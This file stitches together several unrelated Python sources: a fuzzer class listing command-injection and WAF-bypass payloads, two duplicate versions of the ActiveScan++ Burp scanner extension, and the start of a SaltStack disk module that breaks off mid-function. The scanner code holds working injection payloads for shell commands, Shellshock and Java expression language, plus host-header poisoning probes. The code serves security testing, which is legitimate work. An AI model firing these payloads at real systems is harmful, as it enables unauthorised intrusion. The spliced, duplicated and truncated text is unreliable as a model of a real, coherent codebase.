#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class CmdInjection(Fuzzer):

    """CmdInjection"""

    def __init__(self):
        super(CmdInjection, self).__init__()

    @staticmethod                    
    def test(self):
        return [
            "|id",                    
            "=cmd|'cmd'!''",                    
            ";id",                    
            "\n\rid",                    
            "`id`",                    
            "${id}",                    
            "\x00`id`",                    
        ]

    @staticmethod                    
    def wafbypass(self):
        return [
            "i\\d",
            "i''d",
            "/u??/bin/id",
            "a=i;b=d;$a$b",
        ]

# Author: James Kettle <albinowax+acz@gmail.com>
# Copyright 2014 Context Information Security up to 1.0.5
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    from string import Template
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."


version = "1.0.9"                    
callbacks = None


class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks
        callbacks = this_callbacks

        callbacks.setExtensionName("activeScan++")

        # Register host attack components
        host = HostAttack(callbacks)
        callbacks.registerScannerInsertionPointProvider(host)
        callbacks.registerScannerCheck(host)

        # Register code exec component
        callbacks.registerScannerCheck(CodeExec(callbacks))


        callbacks.registerScannerCheck(JetLeak(callbacks))

        print "Successfully loaded activeScan++ v" + version

        return

class JetLeak(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

    def doActiveScan(self, basePair, insertionPoint):
        if 'Referer' != insertionPoint.getInsertionPointName():
            return None
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest("\x00"))
        resp_start = self._helpers.bytesToString(attack.getResponse())[:30]                    
        if '400 Illegal character 0x0 in state' in resp_start:                    
            return [CustomScanIssue(attack.getHttpService(), self._helpers.analyzeRequest(attack).getUrl(), [attack], 'CVE-2015-2080 (JetLeak)',
                                                "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory.<br/>"                    
                                                "Refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information.", 'Firm', 'High')]
        return None

# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._done = getIssues('Code injection')

        self._payloads = {
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271, CVE-2014-6278
            'any': ['"&timeout $time&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],                    
            'php': [],
            'perl': [],
            'ruby': [],                    
            # Expression language injection
            'java': [
                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }

        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5': 'php',
            'php4': 'php',
            'php3': 'php',
            'php': 'php',
            'pl': 'perl',
            'cgi': 'perl',
            'jsp': 'java',
            'do': 'java',
            'action': 'java',
            'rb': 'ruby',
            '': ['php', 'ruby', 'java'],
            'unrecognised': 'java',

            # Code we don't have exploits for
            'asp': 'any',
            'aspx': 'any',
        }


    def doActiveScan(self, basePair, insertionPoint):
        if (insertionPoint.getInsertionPointName() == "hosthacker"):
            return None

        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])

        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if (baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if (self._attack(basePair, insertionPoint, payload, 10)[0] > baseTime + 6):                    
                print "Suspicious delay detected. Confirming it's consistent..."
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                if (dummyTime < baseTime + 4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 10)                    
                    if (timer > dummyTime + 6):
                        print "Code execution confirmed"
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        if (url in self._done):
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                    dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                    timer) + "</b> seconds", 'Firm', 'High')]

        return None

    def _getLangs(self, basePair):
        ext = self._helpers.analyzeRequest(basePair).getUrl().getPath().split('.')[-1]                    
        if (ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if (isinstance(code, basestring)):
            code = [code]
        return code


    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)

        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
        timer = time.time() - timer
        print "Response time: " + str(round(timer, 2)) + "| Payload: " + payload

        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if (not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)

        return (timer, attack)


class HostAttack(IScannerInsertionPointProvider, IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._referer = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))

        # Load previously identified scanner issues to prevent duplicates
        try:
            self._rebind = map(lambda i: i.getAuthority(), getIssues('Arbitrary host header accepted'))
        except Exception:
            print "Initialisation callback failed. This extension requires burp suite professional and Jython 2.5."

        self._poison = getIssues('Host header poisoning')

    def getInsertionPoints(self, basePair):
        rawHeaders = self._helpers.analyzeRequest(basePair.getRequest()).getHeaders()

        # Parse the headers into a dictionary
        headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])

        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return None

        response = self._helpers.bytesToString(basePair.getResponse())

        # If the response doesn't reflect the host header we can't identify successful attacks
        if (headers['HOST'] not in response):
            print "Skipping host header attacks on this request as the host isn't reflected"
            return None

        return [HostInsertionPoint(self._helpers, basePair, headers)]


    def doActiveScan(self, basePair, insertionPoint):

        # Return if the insertion point isn't the right one
        if (insertionPoint.getInsertionPointName() != "hosthacker"):
            return None

        # Return if we've already flagged both issues on this URL
        url = self._helpers.analyzeRequest(basePair).getUrl()
        host = url.getAuthority()
        if (host in self._rebind and url in self._poison):
            return None

        # Send a baseline request to learn what the response should look like    
        legit = insertionPoint.getBaseValue()
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': legit}, legit)
        baseprint = tagmap(resp)

        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        taint = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))
        taint += '.' + legit
        issues = []

        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': taint}, taint)
        if (hit(resp, baseprint)):

            # flag DNS-rebinding if we haven't already, and the page actually has content
            if (baseprint != '' and host not in self._rebind):
                issues.append(self._raise(basePair, attack, host, 'dns'))

            if (taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'host'))
                return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, insertionPoint, {'abshost': legit, 'host': taint}, taint)
            if (hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'abs'))

        #	Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': legit, 'xfh': taint}, taint)
        if (hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
            issues.append(self._raise(basePair, attack, host, 'xfh'))

        return issues

    def _raise(self, basePair, attack, host, type):
        service = attack.getHttpService()
        url = self._helpers.analyzeRequest(attack).getUrl()

        if (type == 'dns'):
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>
            
                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>
                    
                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
            self._rebind.append(host)
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """
            self._poison.append(url)
        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue

    def _attack(self, basePair, insertionPoint, payloads, taint):
        proto = self._helpers.analyzeRequest(basePair).getUrl().getProtocol() + '://'
        if ('abshost' in payloads):
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + self._referer
        print "Host attack: " + str(payloads)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(),
                                           insertionPoint.buildRequest('hosthacker' + pickle.dumps(payloads)))
        response = self._helpers.bytesToString(attack.getResponse())
        requestHighlights = [jarray.array([m.start(), m.end()], 'i') for m in
                             re.finditer('(' + '|'.join(payloads.values()) + ')',
                                         self._helpers.bytesToString(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(), m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return (attack, response)


# Take input from HostAttack.doActiveScan() and use it to construct a HTTP request
class HostInsertionPoint(IScannerInsertionPoint):
    def __init__(self, helpers, basePair, rawHeaders):
        self._helpers = helpers
        self._baseHost = rawHeaders['HOST']
        request = self._helpers.bytesToString(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)

        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)

        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if ('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)

        if ('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)

        self._requestTemplate = Template(request)
        return None

    def getInsertionPointName(self):
        return "hosthacker"

    def getBaseValue(self):
        return self._baseHost

    def buildRequest(self, payload):

        # Drop the attack if it didn't originate from my scanner
        # This will cause an exception, no available workarounds at this time
        payload = self._helpers.bytesToString(payload)
        if (payload[:10] != 'hosthacker'):
            return None

        # Load the supplied payloads into the request
        payloads = pickle.loads(payload[10:])
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']

        for key in ('xfh', 'abshost', 'host', 'referer'):
            if key not in payloads:
                payloads[key] = ''

        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = time.time()

        request = self._requestTemplate.substitute(payloads)
        return self._helpers.stringToBytes(request)


    def getPayloadOffsets(self, payload):
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail + '<br/><br/><div style="font-size:8px">This issue was reported by ActiveScan++</div>'
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService


# misc utility methods
def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))


# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))

# Author: James Kettle <albinowax+acz@gmail.com>
# Copyright 2014 Context Information Security up to 1.0.5
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    from string import Template
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."


version = "1.0.10"
callbacks = None


class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks
        callbacks = this_callbacks

        callbacks.setExtensionName("activeScan++")

        # Register host attack components
        host = HostAttack(callbacks)
        callbacks.registerScannerInsertionPointProvider(host)
        callbacks.registerScannerCheck(host)

        # Register code exec component
        callbacks.registerScannerCheck(CodeExec(callbacks))


        callbacks.registerScannerCheck(JetLeak(callbacks))

        print "Successfully loaded activeScan++ v" + version

        return

# Detect CVE-2015-2080
# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
class JetLeak(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

    def doActiveScan(self, basePair, insertionPoint):
        if 'Referer' != insertionPoint.getInsertionPointName():
            return None
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest("\x00"))
        resp_start = self._helpers.bytesToString(attack.getResponse())[:90]
        if '400 Illegal character 0x0 in state' in resp_start and '<<<' in resp_start:
            return [CustomScanIssue(attack.getHttpService(), self._helpers.analyzeRequest(attack).getUrl(), [attack], 'CVE-2015-2080 (JetLeak)',
                                                "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory<br/>"
                                                "Please refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information", 'Firm', 'High')]
        return None

# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._done = getIssues('Code injection')

        self._payloads = {
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271, CVE-2014-6278
            'any': ['"&ping -n $time localhost&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],                    
            'php': [],
            'perl': [],
            'ruby': ['|sleep $time & ping -n $time localhost'],
            # Expression language injection
            'java': [
                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }

        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5': 'php',
            'php4': 'php',
            'php3': 'php',
            'php': 'php',
            'pl': 'perl',
            'cgi': 'perl',
            'jsp': 'java',
            'do': 'java',
            'action': 'java',
            'rb': 'ruby',
            '': ['php', 'ruby', 'java'],
            'unrecognised': 'java',

            # Code we don't have exploits for
            'asp': 'any',
            'aspx': 'any',
        }


    def doActiveScan(self, basePair, insertionPoint):
        if (insertionPoint.getInsertionPointName() == "hosthacker"):
            return None

        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])

        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if (baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if (self._attack(basePair, insertionPoint, payload, 11)[0] > baseTime + 6):
                print "Suspicious delay detected. Confirming it's consistent..."
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                if (dummyTime < baseTime + 4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                    if (timer > dummyTime + 6):
                        print "Code execution confirmed"
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        if (url in self._done):
                            print "Skipping report - vulnerability already reported"
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                    dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                    timer) + "</b> seconds", 'Firm', 'High')]

        return None

    def _getLangs(self, basePair):
        path = self._helpers.analyzeRequest(basePair).getUrl().getPath()
        if '.' in path:
            ext = path.split('.')[-1]
        else:
            ext = ''

        if (ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if (isinstance(code, basestring)):
            code = [code]
        return code


    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)

        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
        timer = time.time() - timer
        print "Response time: " + str(round(timer, 2)) + "| Payload: " + payload

        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if (not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)

        return (timer, attack)


class HostAttack(IScannerInsertionPointProvider, IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()

        self._referer = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))

        # Load previously identified scanner issues to prevent duplicates
        try:
            self._rebind = map(lambda i: i.getAuthority(), getIssues('Arbitrary host header accepted'))
        except Exception:
            print "Initialisation callback failed. This extension requires burp suite professional and Jython 2.5."

        self._poison = getIssues('Host header poisoning')

    def getInsertionPoints(self, basePair):
        rawHeaders = self._helpers.analyzeRequest(basePair.getRequest()).getHeaders()

        # Parse the headers into a dictionary
        headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])

        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return None

        response = self._helpers.bytesToString(basePair.getResponse())

        # If the response doesn't reflect the host header we can't identify successful attacks
        if (headers['HOST'] not in response):
            print "Skipping host header attacks on this request as the host isn't reflected"
            return None

        return [HostInsertionPoint(self._helpers, basePair, headers)]


    def doActiveScan(self, basePair, insertionPoint):

        # Return if the insertion point isn't the right one
        if (insertionPoint.getInsertionPointName() != "hosthacker"):
            return None

        # Return if we've already flagged both issues on this URL
        url = self._helpers.analyzeRequest(basePair).getUrl()
        host = url.getAuthority()
        if (host in self._rebind and url in self._poison):
            return None

        # Send a baseline request to learn what the response should look like    
        legit = insertionPoint.getBaseValue()
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': legit}, legit)
        baseprint = tagmap(resp)

        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        taint = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(6))
        taint += '.' + legit
        issues = []

        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': taint}, taint)
        if (hit(resp, baseprint)):

            # flag DNS-rebinding if we haven't already, and the page actually has content
            if (baseprint != '' and host not in self._rebind):
                issues.append(self._raise(basePair, attack, host, 'dns'))

            if (taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'host'))
                return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, insertionPoint, {'abshost': legit, 'host': taint}, taint)
            if (hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
                issues.append(self._raise(basePair, attack, host, 'abs'))

        #	Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, insertionPoint, {'host': legit, 'xfh': taint}, taint)
        if (hit(resp, baseprint) and taint in resp and url not in self._poison and self._referer not in resp):
            issues.append(self._raise(basePair, attack, host, 'xfh'))

        return issues

    def _raise(self, basePair, attack, host, type):
        service = attack.getHttpService()
        url = self._helpers.analyzeRequest(attack).getUrl()

        if (type == 'dns'):
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>
            
                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>
                    
                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
            self._rebind.append(host)
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """
            self._poison.append(url)
        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue

    def _attack(self, basePair, insertionPoint, payloads, taint):
        proto = self._helpers.analyzeRequest(basePair).getUrl().getProtocol() + '://'
        if ('abshost' in payloads):
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + self._referer
        print "Host attack: " + str(payloads)
        attack = callbacks.makeHttpRequest(basePair.getHttpService(),
                                           insertionPoint.buildRequest('hosthacker' + pickle.dumps(payloads)))
        response = self._helpers.bytesToString(attack.getResponse())
        requestHighlights = [jarray.array([m.start(), m.end()], 'i') for m in
                             re.finditer('(' + '|'.join(payloads.values()) + ')',
                                         self._helpers.bytesToString(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(), m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return (attack, response)


# Take input from HostAttack.doActiveScan() and use it to construct a HTTP request
class HostInsertionPoint(IScannerInsertionPoint):
    def __init__(self, helpers, basePair, rawHeaders):
        self._helpers = helpers
        self._baseHost = rawHeaders['HOST']
        request = self._helpers.bytesToString(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)

        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)

        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if ('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)

        if ('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)

        self._requestTemplate = Template(request)
        return None

    def getInsertionPointName(self):
        return "hosthacker"

    def getBaseValue(self):
        return self._baseHost

    def buildRequest(self, payload):

        # Drop the attack if it didn't originate from my scanner
        # This will cause an exception, no available workarounds at this time
        payload = self._helpers.bytesToString(payload)
        if (payload[:10] != 'hosthacker'):
            return None

        # Load the supplied payloads into the request
        payloads = pickle.loads(payload[10:])
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']

        for key in ('xfh', 'abshost', 'host', 'referer'):
            if key not in payloads:
                payloads[key] = ''

        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = time.time()

        request = self._requestTemplate.substitute(payloads)
        return self._helpers.stringToBytes(request)


    def getPayloadOffsets(self, payload):
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail + '<br/><br/><div style="font-size:8px">This issue was reported by ActiveScan++</div>'
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService


# misc utility methods
def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))


# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))

# -*- coding: utf-8 -*-
'''
Module for gathering disk information
'''

# Import python libs
import logging

# Import salt libs
import salt.utils

log = logging.getLogger(__name__)


def __virtual__():
    '''
    Only work on POSIX-like systems
    '''
    if salt.utils.is_windows():
        return False
    return 'disk'


def usage(args=None):
    '''
    Return usage information for volumes mounted on this minion

    CLI Example:

    .. code-block:: bash

        salt '*' disk.usage
    '''
    if __grains__['kernel'] == 'Linux':
        cmd = 'df -P'
    elif __grains__['kernel'] == 'OpenBSD':
        cmd = 'df -kP'
    else:
        cmd = 'df'
    if args:
        cmd = cmd + ' -' + args                    
    ret = {}
